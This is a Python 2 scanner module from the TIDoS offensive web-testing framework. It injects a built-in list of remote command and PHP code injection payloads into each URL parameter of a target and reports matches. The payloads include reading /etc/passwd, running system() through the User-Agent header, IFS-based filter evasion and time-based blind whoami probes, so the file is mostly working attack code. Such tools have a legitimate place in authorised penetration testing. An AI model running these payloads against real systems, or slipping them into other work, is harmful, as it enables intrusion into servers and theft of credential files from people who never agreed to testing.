#!/usr/bin/env python2
# coding: utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/the-Infected-Drake/TIDoS-Framework 

import sys
import time
import re
import urllib
from urllib import FancyURLopener
from colors import *

class UserAgent(FancyURLopener):
	verion = 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0'

useragent = UserAgent()


class HTTP_HEADER:
	HOST = "Host"
	SERVER = "Server"

def headread(url):
	print GR+" [*] Testing site...\n"
	opener = urllib.urlopen(url)
	if (opener.code == 200):
		print G+" [+] Status: (200 - OK)"
	if (opener.code == 404):
		print R+" [-] Status: Server maybe down (404)"
		exit()

	Server = opener.headers.get(HTTP_HEADER.SERVER)
	Host = url.split("/")[2]
	print C+" [+] Host: " + str(Host)
	print B+" [+] Web server: " + str(Server)

def exploit(url, payloads, check):

	opener = urllib.urlopen(url)
	vuln = 0
	
	print GR+' [*] Scanning...'
	for params in url.split("?")[1].split("&"):
		for payload in payloads:
			bugs = url.replace(params, params + str(payload).strip())
			request = useragent.open(bugs)
			print B+' [*] Trying payload :> '+C+str(payload)
			html = request.readlines()
			for line in html:
				checker = re.findall(check, line)
				if (len(checker) != 0):
					print G+" [+] Possible vulnerability found!"
					print C+" [+] Payload: ", payload
					print R+" [+] Example POC: " + bugs
					vuln = vuln + 1

	if (vuln == 0):
		print G+"\n [+] This web is damn secure. No vulnerabilities found. :)\n"
	else:
		print "\n [+] "+str(vuln)+" Bugs Found. Happy Hunting... :) \n"



def RCEfunction(url):

	print GR+' [*] Loading payloads...'
	time.sleep(0.8)
	payloads = [';${@print(md5(RCEVulnerable))}', ';${@print("RCEVulnerable")}', "${@print(system($_SERVER['HTTP_USER_AGENT']))}", ';{$_GET["cmd"]}', ';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ':phpversion();', ';cat /etc/passwd', '&&root:x:0:0:root:/root:/bin/bash', 'root:x:0:0:root:/root:/bin/bash', 'daemon:x:1:1:daemon:/usr/sbin:/bin/sh', 'bin:x:2:2:bin:/bin:/bin/sh', 'sys:x:3:3:sys:/dev:/bin/sh]', '&&bin:x:2:2:bin:/bin:/bin/sh',"X=$'uname\x20-a'&&$X",";X=$'uname\x20-a'&&$X", 'ping%CommonProgramFiles:~10,-18%IP', 'ping%PROGRAMFILES:~10,-5%IP', '&&ping%CommonProgramFiles:~10,-18%IP', ';ping%PROGRAMFILES:~10,-5%IP', 'IFS=,;`cat<<<uname,-a`', '&&IFS=,;`cat<<<uname,-a`',';IFS=,;`cat<<<uname,-a`','time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi', '&&time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi', ';time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi', 'who$@ami','&&who$@ami',';who$@ami','cat$IFS/etc/passwd',';cat$IFS/etc/passwd','&&cat$IFS/etc/passwd']
	print G+' [+] '+str(len(payloads)+1)+' Payloads loaded!'
	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
	exploit(url, payloads, check)

def rce(web):

	web0 = raw_input(O+' [#] Scope path parameter (eg. /ping.php?site=foo) :> ')
	if "?" in web0 and '=' in web0:
		if web0.startswith('/'):
			m = raw_input(GR+'\n [!] Your path starts with "/".\n [#] Do you mean root directory? (Y/n) :> ')
			if m == 'y' or m == 'Y':
				web00 = web + web0
			elif m == 'n' or m == 'N':
				web00 = web + web0
			else:
				print R+' [-] U mad?'
		else:
			web00 = web + '/' + web0

		RCEfunction(web00)
	else:
		print R+" [-] Please enter the URL with parameters..."
		rce(web)

